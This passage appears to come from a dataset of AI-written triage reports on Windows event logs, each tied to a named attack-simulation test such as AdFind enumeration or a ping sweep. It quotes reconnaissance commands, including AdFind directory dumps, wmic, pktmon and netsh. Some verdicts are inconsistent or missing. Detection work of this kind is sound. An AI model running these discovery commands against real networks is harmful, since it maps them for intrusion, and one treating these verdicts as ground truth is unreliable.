The indicators such as execution of PowerShell scripts, enumeration of system and network configurations, and frequent querying of user accounts, particularly involving known penetration testing tools like PowerView, strongly suggest SUSPICIOUS activity warranting further investigation. There are no direct signs of malicious exploitation (like lateral movement or persistent backdoors), but there is enough suspicious behavior that needs careful scrutiny, especially given the context and presence of PowerShell commands targeting domain information.

**Resolution**:
**SUSPICIOUS** - The logs show potential reconnaissance activity. Further investigation should include checking the legitimacy of the `admin_test` user account's activities, validating the source of the scripts executed, and monitoring network traffic for any exfiltration attempts."
Adfind - Enumerate Active Directory Subnet Objects,"Upon reviewing the provided logs, I have performed a detailed analysis of the events recorded in the Application, Sysmon, Security, and System logs. Here are the key findings:

1. **Application Log:**
   - All entries indicate Windows Defender (SecurityCenter) is operational, with logs showing the state as ""SECURITY_PRODUCT_STATE_ON."" This suggests that Windows Defender was up and running without any issues.

2. **Sysmon Log:**
   - Multiple standard processes were executed, including those related to Windows Update (wuauclt.exe, UsoClient.exe), MicrosoftEdgeUpdate.exe, and various legitimate System32 executables like MpSigStub.exe and wsqmcons.exe.
   - Of particular note is the execution of `AdFind.exe` under a path within a temporary directory, which was executed via cmd.exe:
     ```
     ""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -f (objectcategory=subnet)
     ```
     This usage of AdFind might warrant further investigation as it's a known utility used for querying Active Directory and is often used by attackers in reconnaissance steps.
   - The repeated execution of tools like `conhost.exe` and `wevtutil.exe` in rapid succession might also warrant closer inspection, though they can often appear in normal operational logs under certain conditions.

3. **Security Log:**
   - Standard successful logons were recorded with Event ID 4624 for SYSTEM account usage. These are expected within normal operation for various system processes.
   - Privilege assignments for SYSTEM are noted (Event ID 4672), which is typical behavior during system processes operation.
   - Numerous Event ID 5379 records are logged, indicating unsuccessful credential recovery attempts, characterized by the return code ""3221226021.""

4. **System Log:**
   - An entry for a Windows Update event (Event ID 19) shows a successful update of Microsoft's Defender Antivirus signatures. This indicates the target's update mechanism was functioning as expected.

### Assessment:

From the analysis, the majority of the activity appears to be routine Windows operational logs. However, two components may require further scrutiny:

- **AdFind.exe execution**: This stands out as potentially suspicious, as it is being executed from a non-standard location under a temporary directory. It could be indicative of an attacker using a legitimate tool for malicious reconnaissance purposes.
  
- **Multiple unsuccessful credential operations**: These could suggest an underlying attempt at credential manipulation or access, though the specifics depend on whether these actions align with typical administrative tasks in this environment.

### Resolution:

Given these points, the resolution of this log analysis would be:

- **SUSPICIOUS** - There is activity involving `AdFind.exe` and unsuccessful credential operations that do not align squarely with typical benign activity and warrant further investigation. Further steps could include:
  - Investigating the user account associated with the `AdFind.exe` execution for any unauthorized activity.
  - Checking for other instances of `AdFind.exe` or similar tools being introduced into the network.
  - Reviewing access logs to determine if credential errors align with known administrative activity or if they indicate attempted unauthorized access."
Wmic Group Discovery,"Upon analyzing the Windows event logs available, some aspects stand out as they could potentially indicate suspicious activity:

1. **Process Executions and Nature**:
   - There are multiple instances of utilities like `hostname.exe`, `whoami.exe`, `cmd.exe`, and `wmic.exe` being executed. These tools are standard Windows executables, typically used for retrieving system and user information.
   - The execution of `cmd.exe` with the command line `""cmd.exe"" /c wmic group get name` suggests an inquiry into the group names on the system, typically not suspicious on its own but worth noting in the context of other activities.

2. **Frequent Execution of System Utilities**:
   - The repeated running of `hostname.exe`, `whoami.exe`, and usage of `wmic` can sometimes suggest an enumeration pattern, where a script or actor is gathering information about the host system.
   - `wevtutil.exe` is another utility being executed frequently. This tool interacts with event logs, and frequent execution could indicate log querying or manipulation activities.

3. **Log Management Activity**:
   - Usage of `wevtutil.exe` with high frequency can be typical for log management or indicative of covering tracks, especially if there were attempts to clear the logs. However, from the data, there’s no direct evidence of log clearance.

4. **Time Change Events**:
   - There are noted changes in system time which could be an attempt to obscure log timings, although the specifics suggest minor adjustments consistent with system synchronization rather than abrupt, obvious tampering.

5. **High Integrity Level**:
   - All processes appear to be executed with a high integrity level, being run by `SERVER002\admin_test`, suggesting an administrative account usage, which aligns with a potentially authorized user conducting activities.

Given the context of these logs, the activities overview does not immediately indicate definitively malicious behavior. However, due to the potential for these utilities to be used for further enumeration or reconnaissance, it could be considered:

**Resolution: SUSPICIOUS**

### Recommendations:
- **Further Investigation**: Recommend correlating these logs with network activity, any external connection attempts, and changes in critical files to verify if there was any unauthorized access or data exfiltration attempt.
- **User Verification**: Confirm the legitimacy of activities undertaken by `SERVER002\admin_test`. Check if these executions match any approved administrative tasks.
- **Monitor System**: Increase monitoring on `Server002` for similar patterns or escalation in activities that may indicate a compromise.
- **Contextual Awareness**: If available, review organizational change control logs to determine if these actions correspond with legitimate changes. 

This should guide you in determining any latent threats within the system environment and whether further security posture enhancements are necessary."
Remote System Discovery - ping sweep,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, several log entries need further analysis due to potential indicators of suspicious activity. Below, they are segmented into various logs for clarity:

#### 1. Application Log
- **Windows Defender State (Event ID 15):** 
  The entry indicates that Windows Defender is active, which is generally positive for system security. 

#### 2. Windows PowerShell Log
- **PowerShell Execution (Event IDs 600, 400, 403):**
  Multiple PowerShell commands are executed with a restricted policy which is generally secure. However, the command executed by PowerShell to scan and match patterns in INF files could indicate reconnaissance for vulnerable drivers through the `[defaultinstall.nt(amd64|arm|arm64|x86)]` pattern. This activity appears automated and could be part of a legitimate script, but without specific context, it's worth noting as unusual.

#### 3. System Log
- **Windows Update Activities (Event IDs 44, 43, 19):**
  Multiple Windows updates and component installations are recorded. These are standard operations unless observed frequently in a manner suggesting the installation of unnecessary applications, which can occasionally indicate unauthorized software deployment.

#### 4. Sysmon Log
- **Ping Sweep (Multiple Event IDs for Process Creation):**
  These log entries detail a ping sweep across a local subnet (192.168.1.x). This behavior can indicate network reconnaissance, possibly from an attacker attempting to map out devices on the network. The use of `cmd.exe /c for /l …` to iterate through addresses and execute `ping` could be part of a script or unauthorized scanning.

- **Use of System Utilities (e.g., `wevtutil.exe`, `hostname.exe`, `whoami.exe`):**
  Often used for legitimate purposes, but could indicate misuse or preparation for attack if seen in conjunction with reconnaissance activities or privilege escalations.

- **Command Line Execution (Process Creation via `cmd.exe`):**
  The use of batch processing to perform a ping sweep is typical of network mapping rather than legitimate user activity unless explicitly scheduled or expected.

#### 5. Security Log
- **User Logons (Event ID 4624) and Privileges (Event ID 4672):**
  Multiple logon activities involving a user `admin_test` and SYSTEM are observed. The privileged actions (with a significant list including debug and impersonate privileges) are broad and could allow various actions across the system. Context is key; if these aren't part of a routine or authorized administrative activity, they are concerning.

### Assessment and Guidance

- **Assessment:**
  - **SUSPICIOUS:** The presence of reconnaissance-type activities through a ping sweep, combined with detailed PowerShell activity querying system files and multiple high-privilege actions, raises concerns. This might indicate initial stages of a planned compromise, or it could be benign if performed by system admins for legitimate maintenance. Without additional context, particularly around the intentions behind the PowerShell script and network mapping, these activities must be investigated further.

- **Guidance:**
  1. **PowerShell Scripting:** Review and verify the legitimacy and purpose of the executed PowerShell scripts. If part of a broader system audit or scheduled task, ensure this is documented.
  2. **Ping Sweep Investigation:** Confirm if network mapping was authorized and by whom. Correlate the activity with user authorization logs to ensure legitimacy.
  3. **Admin Activity Verification:** Validate all actions and privileges assigned to the `admin_test` account to confirm they align with job roles and responsibilities.
  4. **Network Monitoring:** Increase monitoring on the network for unauthorized scanning activities and ensure all network changes follow stringent change control processes.
  
The conclusion based on current evidence leads to a **SUSPICIOUS** resolution for further investigation. Proceed with care to mitigate any unwarranted activity and preserve the integrity of the system."
Windows Internal pktmon set filter,"### Detailed Analysis

1. **Process Execution:**
   - The logs show frequent invocations of system binaries such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `pktmon.exe`.
   - **`pktmon.exe`** was executed with a command to add a filter for port 445:
     ```plaintext
     CommandLine: ""cmd.exe"" /c pktmon.exe filter add -p 445
     ```
     - `pktmon.exe` is a packet monitoring tool, and adding a filter on port 445 could indicate a preparation for monitoring or capturing SMB traffic, which is a standard network protocol used for sharing access to files, printers, etc.
   - The execution of `whoami.exe`:
     ```plaintext
     Image: C:\Windows\System32\whoami.exe
     ```
     - This typically determines the current logged-on user but doesn’t necessarily indicate malicious activity on its own.
   - **`wsmprovhost.exe`** is noted as a consistent parent process:
     ```plaintext
     ParentCommandLine: C:\Windows\system32\wsmprovhost.exe -Embedding
     ```
     - This is part of the Windows Remote Management service, which could suggest remote scripting or management activities. However, without additional context, it isn't inherently malicious.

2. **Time Manipulation:**
   - Time changes are recorded multiple times around 14:07:49:
     ```plaintext
     PreviousTime: 2024-10-22 14:07:51.0459280
     NewTime: 2024-10-22 14:07:49.6503872
     ```
   - Event ID 4616 indicates a security audit event where the system time was modified. This could be an attempt to evade detection or manipulate timestamps within logs.

3. **User Accounts:**
   - All the suspicious activities were executed under `SERVER002\\admin_test`. The use of an administrative account can be typical in enterprise environments, but consolidated activity under this account warrants further investigation, especially combined with the execution of `pktmon.exe`.

### Assessment

- **Port Monitoring** via `pktmon.exe` for SMB (port 445) suggests a potential preparation for nefarious activities, such as monitoring traffic for sensitive information, though no additional context, such as network anomalies or subsequent connections, is available in the logs.
- **Time Manipulation** is typically associated with malicious attempts to alter the perception of event timing, possibly to exclude or hide certain activities from view.
- The pattern of executing system utilities like `whoami.exe` and `hostname.exe` might suggest reconnaissance behavior, gathering system and network information.
- **Absence of Standard Alerts**: No explicit alerts or detections from security tools are present in the provided logs to confirm threat actions.

### Conclusion

Final Resolution: **SUSPICIOUS**

- The observed activities are indicative of potential suspicious behaviors:
  - Use of `pktmon.exe` to monitor port 445.
  - Repeated time alterations possibly to obscure log entries.
  - High-level privileges used for these operations.

### Guidance on How to Proceed

1. **Investigate Administrative Activity**: Validate whether the `admin_test` account should be performing these actions.
2. **Correlate with Network Logs**: Check for any corresponding unusual network activity around the time `pktmon.exe` was used.
3. **Audit System Time Change**: Investigate the system time change events for legitimate reasons or any signs of misuse.
4. **Enhanced Monitoring**: Implement stricter monitoring on the `admin_test` account and other privileged accounts for unusual behaviors moving forward.
5. **Threat Hunt**: Conduct threat hunting to ensure no further underlying malicious activities are occurring or have occurred."
Discover System Language with dism.exe,"After analyzing the event logs provided, here's a breakdown of the findings:

### System Log
- **Kernel-General (EventID: 24 and 1):** Several entries where `svchost.exe` is involved in time change activities. The time adjustment event doesn't appear malicious because `svchost.exe` commonly supports system services, including time synchronization.
- **Time-Service (EventID: 35):** The time source was set to `time.windows.com`, which is standard for Windows systems and not inherently suspicious.

### Application Log
- **Edgeupdate Events:** Routine service stop events for `edgeupdate`. This corresponds with the Sysmon logs indicating Edge Update activities, which appear to be part of normal software update processes.

### Security Log
- **EventID 4616:** Indicates time change events initiated by `svchost.exe`. These are consistent with the system log and typically linked to valid system processes or services updating the system time.
- **EventID 4624, 4672:** A user named `admin_test` logs in using NTLM, which is a legitimate authentication protocol. The privileges assigned to this user are standard for administrative roles. Since there isn't context suggesting unauthorized access or compromise, the logons appear legitimate.

### Sysmon Log
- **Process Creation Events:** Several logs where `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe` are run by `admin_test`. These tools can be used in benign administrative tasks and do not inherently indicate malicious behavior without further suspicious context.
- **Microsoft Edge Update Events:** Several operations performed by `MicrosoftEdgeUpdate.exe` indicate routine update processes for the Microsoft Edge browser. The presence of service registration and update operations fits expected update behavior.
- **DISM Events:** The command `dism.exe /online /Get-Intl` is used for querying the system for international settings, which is not suspicious without additional context.

### Assessment
The series of logs reviewed do not demonstrate any definitive, explicitly malicious activities. The processes executed and the services logged appear to align with routine administrative or system maintenance tasks. The Edge Update-related activities are consistent with software update operations and are a common occurrence in enterprise environments.

Adfind - Enumerate Active Directory Admins,"### Detailed Analysis:

Upon reviewing the Windows event logs provided, the goal was to identify any indicators of malicious activity such as unexpected process executions, suspicious command-line arguments, unusual privilege escalation, or other signs that might suggest a security compromise.

#### **Key Observations:**

1. **Process Execution:**
   - Several processes were executed under the user `SERVER002\admin_test`. Notably, processes like `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `cmd.exe` are observed being executed multiple times.
   - A specific entry showed `cmd.exe` executing a suspicious command: 
     - CommandLine: 
       `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdFind.exe"" -sc admincountdmp`
     - **AdFind.exe** is a legitimate tool often used for querying Active Directory; however, its use could be suspicious in certain contexts, particularly on machines that aren't typically used for directory services management.
   - Usage of `whoami.exe` is captured, which can sometimes indicate a check on user privileges and environment post-attack exploitation.

2. **Privilege Escalation:**
   - An event with ID `4672` indicates that the `SYSTEM` account was granted a series of privileges, suggesting a potential privilege escalation attempt. However, given the context and the normal operation of `SYSTEM`, this might not be anomalous.
   - The `SecurityHealthService.exe` and `TiWorker.exe` processes running under `NT AUTHORITY\SYSTEM` are legitimate system processes responsible for Windows Update and Health Services, which do not appear to be malicious in this context.

3. **Command Line Argument Usage:**
   - The presence of various command-line tools being executed is noted, particularly attention is drawn to `AdFind.exe`, which can be used for reconnaissance purposes.
   
4. **Network or Log Manipulation Utilities:**
   - Execution of `wevtutil.exe`, which is used for managing event logs, could indicate attempts to clear or manipulate logs – a common tactic used by attackers to cover tracks. However, no direct evidence in the logs suggests any log manipulation.

5. **Security Events:**
   - The `Security log` includes a successful logon with Event ID `4624` for the `SYSTEM` account and a privileged operation recorded in Event ID `4672`, which are common and expected for system operations.

#### **Assessment:**

- The logs reveal activities consistent with legitimate system management and administration for the most part. However, the execution of `AdFind.exe` and the use of command-line tools suggest potential reconnaissance or unauthorized use.
  
#### **Resolution: SUSPECTED**

- **Justification:** The execution of tools like `AdFind.exe` combined with `wevtutil.exe` can lead to suspicion, particularly if these actions aren't typically performed on this host by the user `admin_test`. The `AdFind.exe` usage might suggest data gathering attempts, which could be part of a red-team exercise or a potential threat actor probing the environment.

#### **Guidance:**
1. **Further Investigation:**
   - Verify the authorized usage of `AdFind.exe` and cross-check with IT operations to determine if there is a legitimate basis for its execution.
   - Investigate the specific tasks being performed by `SERVER002\admin_test` to ensure they align with expected administrative activities.

2. **Monitoring:**
   - Enhance monitoring on the server to track the execution of scripting tools like `PowerShell` and any potential data exfiltration attempts.
   - Set up alerts for atypical usage of potentially dual-use tools like `AdFind.exe`.

3. **Review Privileges:**
   - Assess if the privileges granted to users and processes logged are justified and necessary for their functions.

Based on the suspicious findings, further investigation is warranted to rule out malicious activity or establish the legitimacy of observed actions."
Remote System Discovery - adidnsdump,"Upon analyzing the provided logs, several log entries stand out, indicating potentially suspicious activities.

1. **PowerShell Usage and External Download**:
   - In the Windows PowerShell log, there is a command executed that uses `Invoke-WebRequest` to download a Python setup executable from an external website (`https://www.python.org`). This command then executes the Python setup with silent installation arguments. This activity can be considered suspicious, especially if it was performed without prior authorization or within a critical environment, as downloading and executing binaries from external sources can be used to introduce malicious software.

2. **Execution of Scripts and Commands**:
   - There is an execution of a script using `cmd.exe` with commands related to `adidnsdump` which implies interaction with DNS records. This is a tool often used for DNS reconnaissance in Active Directory environments and can be an indication of attempted lateral movement or network reconnaissance.

3. **Python Installer and Executable**:
   - In the Application log, there are multiple entries related to the successful installation of Python 3.10.4 and related components. This installation was likely performed by the PowerShell command that downloaded and executed the Python installer. The execution of Python could signify the deployment of scripts or applications which, if not sanctioned, could pose a threat.

4. **Presence of Python Executables in Temporary Directories**:
   - The presence of executables like `python-3.10.4-amd64.exe` in the Temp directories (`C:\Windows\Temp\` and `C:\Users\ADMIN_~1\AppData\Local\Temp\`) is a red flag. Usually, legitimate software installations do not run from these directories.

5. **Security Log Events**:
   - The security logs show an event with the ID 4672, indicating that an account was assigned special privileges. While this may not directly indicate compromise, in conjunction with other events, it could suggest unauthorized privilege escalation.

**Assessment**:
While the logs do not contain definitively malicious activities, the use of PowerShell to download and execute software from an external source without clear context is suspicious, as it can potentially be used for malicious purposes like downloading malware. The installation and execution of Python from temporary directories further reduces the trust in these activities, suggesting the potential for unauthorized or malicious installations.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Investigate the origin and authorization of the PowerShell scripts and the need for downloading and installing Python.
- Verify if the user `admin_test` was authorized or whether their account was used maliciously.
- Conduct network traffic analysis around the time of these events to identify any unauthorized external communications.
- Consider implementing further monitoring or restrictions on the use of PowerShell and other script execution to prevent unauthorized actions.
- Review recent security patches and vulnerability mitigations to ensure the system’s defenses are up-to-date."
List Windows Firewall Rules,"**Analysis of the Windows Event Logs:**

### Observations:

1. **Combination of Process Executions:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` being launched within a very short time frame.
   - `wevtutil.exe` is commonly used for managing and querying event logs. However, frequent use can be suspicious if not typical for the system.
   - `conhost.exe` is associated with console window operations.
   - Execution of `cmd.exe` with the command line argument for displaying firewall rules is present.

2. **Utility Executions:**
   - `hostname.exe` and `whoami.exe` are also executed. These are generally benign but could suggest reconnaissance activity if used frequently or unexpectedly.
  
3. **Administrative Commands:**
   - Use of `cmd.exe` to execute `netsh advfirewall firewall show rule name=all`, potentially indicating unauthorized exploration of firewall rules.

4. **Update and Security Logs:**
   - Logs from Windows Update indicate regular update activities, including Security Intelligence Updates for Microsoft Defender Antivirus.

5. **Security Log Entries:**
   - Multiple instances of Event ID 5379, indicating a localized security audit failure related to Microsoft account operations. Return codes indicate failed attempts but may not necessarily imply malicious activity.

6. **System Integrity:**
   - Windows Defender is active with ""SECURITY_PRODUCT_STATE_ON,"" indicating that the system's built-in defenses are operational.

7. **Sysmon Logs for Service Processes:**
   - `wuauclt.exe` and `AM_Delta.exe` for Windows updates appear to be legitimate activity.
   - Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) events seem typical for automated browser maintenance.

### Assessment:

The logs exhibit a series of utility executions typical for administrative operations but might seem out of the ordinary if uncommon under typical usage. The repeated execution of `wevtutil.exe` and commands viewing firewall rules might signal normal administrative tasks or possible reconnaissance. Additionally, short intervals between process logs can hint at some scripted or automated actions, potentially aligning with legitimate administrative checks or routine system management.

There are no definitive indicators of compromise or malicious activity such as unauthorized software installs, unexpected outbound connections, or privilege escalations within the log data provided.

### Recommendation and Resolution:

- **Monitor:** Continue to monitor these processes for any escalation or variance in behavior. If these utilities align with scheduled tasks or known administrative actions, the behavior could be benign.
- **Audit User Actions:** Confirm with the system or network administrators about recent administrative activities performed on Server002.
- **Review Security Logs:** Look into the security event ID 5379 details if Microsoft Account-related failures could lead to any real issues, although at present, they don’t seem critical.

**Resolution: SUSPICIOUS** - The activity doesn't match typical usage patterns and calls for further inquiry and confirmation with relevant administrators."
Win32_PnPEntity Hardware Inventory,"Upon analyzing the provided Windows event logs, the following observations were made:

1. **Frequent Use of `whoami.exe`, `wevtutil.exe`, and `conhost.exe`:**
   - Multiple instances of `whoami.exe` and `conhost.exe` are visible, spawned by the same user (`SERVER002\admin_test`). While `whoami.exe` itself is a benign utility to check user identity, frequent execution might indicate a script or automated task accessing user information.
   - `wevtutil.exe` is responsible for managing event logs which may be used for legitimate purposes. However, if frequently executed without a clear reason, it could suggest log clearing or manipulation, a behavior seen in live-off-the-land attacks.

2. **PowerShell Script Activity:**
   - A PowerShell script was executed, involving `Get-WMIObject`, which gathers information about hardware and drivers on the system.
   - There is no apparent execution of suspicious obfuscations or downloads, but any automated gathering of system information might indicate preparation for lateral movement or privilege escalation.

3. **Execution with High Integrity Level:**
   - Several processes were initiated with high integrity, indicating that they have administrative privileges. This is typical for legitimate tasks but is also a critical step in performing malicious activities. The user `SERVER002\admin_test` has high-level activities and might require further scrutiny.

4. **Regular System and Security Log Entries:**
   - The System and Security logs show regular synchronizations and adjustments, primarily from `svchost.exe`. No anomalies were observed here relating to time tampering that would suggest sophisticated attacks like timestamp manipulations.

5. **Background Services and Microsoft Edge Updates:**
   - Normal operations for services like Microsoft Edge Update are observed (`MicrosoftEdgeUpdate.exe`), which runs under `NT AUTHORITY\SYSTEM`. These processes seem typical unless used under incorrect user contexts or at bizarre timestamps.

**Assessment and Resolution:**
- **Anomalous but Not Overtly Malicious:** There is suspicious behavior in these logs, such as frequent executions of `whoami.exe`, Log management via `wevtutil.exe`, and PowerShell executions collecting system information. However, no explicitly documented malicious patterns, such as obfuscated script execution or attempts to disable security, are observed.
- **Potential Insider or Maladministration:** Given the context of execution and the use of standard tools for potentially non-standard operations, this could be insider probing or mismanagement.

**Resolution:** **SUSPICIOUS**

**Guidance and Actions:**
- Perform a deeper forensic analysis on the `SERVER002\admin_test` account and investigate for unauthorized script/batch file creations.
- Verify scheduled tasks for potential automated executions involving reviewed applications.
- Monitor PowerShell scripts and logs for unusual commands or script activities.
- Conduct user awareness and potentially interview `admin_test` for contextual understanding."
operating system discovery,"Upon reviewing the provided logs, here is the detailed analysis:

### System and Security Logs:
- **Kernel-General Events (EventID 24 and 1):** Time synchronization events are logged, which is normal for a system maintaining accurate time using an NTP server, specifically `time.windows.com`. This is standard behavior and not indicative of malicious activity.
- **Security Logs (EventID 4616):** Correspond to changes in system time, consistent with the time synchronization events from the System log. These changes appear deliberate and controlled, likely part of normal system operations.

### Windows PowerShell Logs:
- **PowerShell Execution (EventID 600 and 400):** The activities logged depict a PowerShell console session performing non-critical tasks like querying system information using `Get-CimInstance` and are not inherently suspicious. No script or command indicates risky behavior or exploitation attempts.

### Sysmon Logs:
- **Process Creation Events (EventID 1 and 5):** The processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `svchost.exe` show executions typical of administrative activity. They're executed by a user (`SERVER002\\admin_test`) with a high integrity level suggesting legitimate administrative access.
- **PowerShell Execution (Sysmon Event 1 for `powershell.exe`):** Mirrors what's seen in the PowerShell event log. Queries executed appear to be benign, focusing on system information gathering without setting atypical configurations or executing remote tasks.
- **Valuable Insight:** The presence of `wevtutil.exe` and `svchost.exe` use along with common administrative tools implies system auditing or log management task.

### Application Logs:
- **Software Protection Platform Event (EventID 16384):** This indicates the software protection service running as expected without logging any incidents suggestive of tampering or failure.

### Assessment:
- **Benign Observations:** The logs exhibit behavior characteristic of regular administrative and system maintenance activity. All timestamps align in a coherent pattern, pointing toward system-related operations likely performed by system administrators or automated processes.
- **Anomalies or Red Flags:** None of the logs stand out as potential threats when it comes to typical behavior for a Windows server in a corporate environment. No privilege escalation attempts or use of known malicious scripts or binaries are noted. The events observed are consistent with time synchronization, log maintenance, and basic system information querying.

### Conclusion:
- After thorough analysis, the activities documented in the logs appear to be routine and maintenance-oriented.
- **Final Resolution: BENIGN.** No evidence of malicious activity is present. Continue monitoring as part of regular security procedures, ensuring that log sources and alert mechanisms remain consistently operational for proactive threat detection."
Adfind - Enumerate Active Directory Trusts,"After examining the provided Windows event logs, here's the analysis:

**Sysmon Log Analysis:**

1. **TrustedInstaller.exe and TiWorker.exe:**
   - These processes are standard components of the Windows Update mechanism, running under the NT AUTHORITY\SYSTEM account. No anomalies are detected here.

2. **PowerShell Usage:**
   - A PowerShell session was initiated by the user ""SERVER002\admin_test."" While the presence of PowerShell can sometimes indicate malicious activity, there is no accompanying command-line argument to suggest a specific nefarious action.

3. **Wevtutil.exe Usage:**
   - Wevtutil.exe is being executed multiple times by ""admin_test."" While this tool can be used both legitimately (e.g., managing event logs) and illegitimately (e.g., purging logs to hide activity), there's no definitive evidence of malicious command-line arguments or actions here.

4. **AdFind.exe Execution:**
   - The process ""cmd.exe"" executes ""AdFind.exe"" with the specific command-line argument ""-gcb -sc trustdmp."" AdFind is a legitimate Active Directory query tool, but it is often used by attackers for intelligence gathering. This is a possible indicator of compromise and warrants further investigation.

5. **Miscellaneous Executions:**
   - Whoami.exe and hostname.exe are being executed, possibly for environment reconnaissance. These processes by themselves aren't inherently malicious but can be suspicious in a malicious chain of activity.

6. **MicrosoftEdgeUpdate.exe:**
   - The Microsoft Edge Update process is running multiple times, which is expected behavior and not suspicious in itself.

**Security Log Analysis:**

- **Event ID 4624 (Logon) and 4672 (Special Privileges Assigned):**
  - These logs indicate a successful logon with special privileges by the SYSTEM account, which isn't unusual by itself.

**Application Log Analysis:**

- **Windows Defender:**
  - Windows Defender appears to be active and in a healthy state.
  
- **Edge Update Service Stopped:**
  - The Edge Update service stopping could be normal behavior, such as a routine update or system policy applied.

**Conclusion:**

Based on the analysis, there is one notable point of activity that stands out: the execution of ""AdFind.exe"" with specific switches, which often indicates adversarial intelligence gathering in compromised networks. Although this single entry alone doesn't confirm malicious activity, it is a classic example seen in reconnaissance phases of attacks.

Therefore, the logs are best categorized as:

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigation is required to determine the purpose of the AdFind tool execution. Verify if this aligns with any legitimate administrative tasks.
- Check with the user ""admin_test"" regarding the intention of the PowerShell and wevtutil.exe usage.
- Review other related logs or system changes around the timeframe of this activity for more context.
- If unauthorized or unexplained, consider conducting a full security assessment on the host and network to ensure no further indicators of compromise exist."
Remote System Discovery - nltest,"Upon analyzing the provided Windows event logs, I have identified the following key observations that stand out in the logs:

1. **Windows Defender Activity:**
   - The application log entry indicates that Windows Defender is in the `SECURITY_PRODUCT_STATE_ON` state. This suggests that Windows Defender is active and running on `Server002`, indicating a baseline level of security on the system.

2. **Repeated Security Events (ID 5379):**
   - The security logs show multiple instances of Event ID 5379, associated with credential read operations that returned a specific error code (3221226021). This return code indicates a ""Status Fail"" for credential activity. On inspection, these logs seem to involve attempts to read credentials related to `MicrosoftAccount:user=02txoixylodcstop`, `WindowsLive:(token)`, and `WindowsLive:(cert)`. The `SubjectUserSid` is `S-1-5-18`, representing the Local System account. Repeated failed credential access under the Local System account can sometimes be part of routine system background operations, particularly if they originate from a trusted source. 

3. **Privilege Assignment (Event ID 4672):**
   - The logs indicate special privileges being assigned to the SYSTEM user, which is standard behavior during system initialization or other legitimate processes. The privileges listed are typical for system-level operations.

4. **System and Maintenance Operations:**
   - The logs show numerous process creation events associated with updates, such as the execution of `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe`. These processes are linked to Windows Update and Defender update operations, which appear to be legitimate.

5. **Sysmon Logging:**
   - There are multiple entries showing the execution of administrative commands like `nltest.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. While these could be routine administrative tasks, it is unusual to see them executed frequently and may necessitate verification of intended usage.

### Assessment:
- **Benign Activities:**
  - The majority of the logged activities appear consistent with standard Windows operations and updates, without any definitive signs of compromise or unauthorized access. The Windows Defender update logs and system update executions (e.g., `wuauclt.exe`) are normal.
   
- **Repeated Credential Access:**
  - Although the repeated failed credential access logs could potentially be suspicious, they often correlate with Windows attempting to perform specific background tasks requiring system-level actions unsuccessfully. The error code and context should be reviewed against known baseline behavior for this system.

- **Command-Line Executions:**
  - A few commands like `whoami` and `hostname` executed by an administrative account could appear out of the ordinary if not part of a known or scheduled task. This could necessitate further exploration if unexpected.

### Final Resolution:
- **SUSPICIOUS:** While most activities are likely routine, the repeated credential read failures and some command-line executions would benefit from further investigation, especially verifying with the system admin if these tasks align with expected operations and determining whether any of them correlate with known or suspected misconfigurations. Further evaluation of network logs and any alerts from intrusion detection/prevention systems would provide additional context."
GetCurrent User with PowerShell Script,"The provided logs present a series of events that need evaluation regarding whether they indicate any malicious activity. Let's break down the logs by category to assess any potential threats:

### Security Log Analysis:
1. **Event ID 4624**: This log indicates a successful logon. The logon type (5) points to a service startup, which is common and expected for system processes like `services.exe`.

2. **Event ID 4672**: This log denotes special privileges assigned to a new logon session. This includes privileges like `SeDebugPrivilege`, which could be a concern if associated with an unknown or unauthorized user. However, in this context, it seems to apply to the `SYSTEM` account, a normal behavior.

3. **Event ID 5379**: This series of logs shows Credential Manager operations that resulted in error (ReturnCode: 3221226021), which typically signifies an operation failure. The consistent TargetName of ""MicrosoftAccount"" is uncharacteristic for a WORKGROUP environment, but without other suspicious context (like known malware operations), this behavior is not definitively malicious.

### System Log Analysis:
1. **Event ID 15**: Shows a registry hive size change, which is part of normal system operations.
2. **Event IDs 43 and 44**: Relate to Windows Update activities for Microsoft Defender, which is normal for security baseline maintenance.

### Windows PowerShell Log Analysis:
This shows the execution of a PowerShell command that writes the current user identity to a file (`CurrentUserObject.txt`). While somewhat unusual if not associated with a legitimate script or administrative task, it doesn't inherently indicate malicious intent without further context.

### Sysmon Log Analysis:
1. **Event ID 5**: Multiple instances of `wevtutil.exe` and `conhost.exe` executed by the `admin_test` user. While `wevtutil` can be used for viewing logs, which can hide malicious activity footprints, its isolated use without further malicious context or pattern isn't enough to claim malicious behavior.
   
2. **Event ID 1**: Shows a series of system and application executions with no anomalous parent-child relationships. Includes PowerShell running from `admin_test` user, but given the legitimate command, no definite malicious activity is confirmed.

3. **Microsoft Edge Update Activities**: Reflecting in the Sysmon log, these processes (`MicrosoftEdgeUpdate.exe` and `setup.exe`) appear related to a legitimate application update.

### Assessment and Guidance:
- **BENIGN**: The logs in isolation do not exhibit strong indicators of compromise. There are several activities that can trigger security alerts but are explainable within the normal behaviors of services running on a system, including system logins, updates, and command line usage. 
- **SUSPICIOUS**: Due to the attempted use of credential management and writing user information to a file via PowerShell without explicit legitimate context could warrant additional focused monitoring, especially if further anomalous behavior emerges tied to specific user accounts like `admin_test`.

### Resolution:
**SUSPICIOUS**
- Recommend setting up additional monitoring or alerts for any escalation of similar behaviors.
- Reassess any unrecognized scripts or PowerShell commands being utilized in the system to ensure they're authorized.
- Verify with the administrator if there are scheduled or manually-run tasks that are utilising these methods.

Hence, conclude a resolution of ""SUSPICIOUS"" pending further investigation or monitoring to affirm no misuse is occurring."
Adfind - Enumerate Active Directory Exchange AD Objects,"The provided event logs suggest a series of actions performed on the Windows host ""Server002"". Here's the analysis of the logs with the following observations:

### Analysis:

1. **Security Logs:**
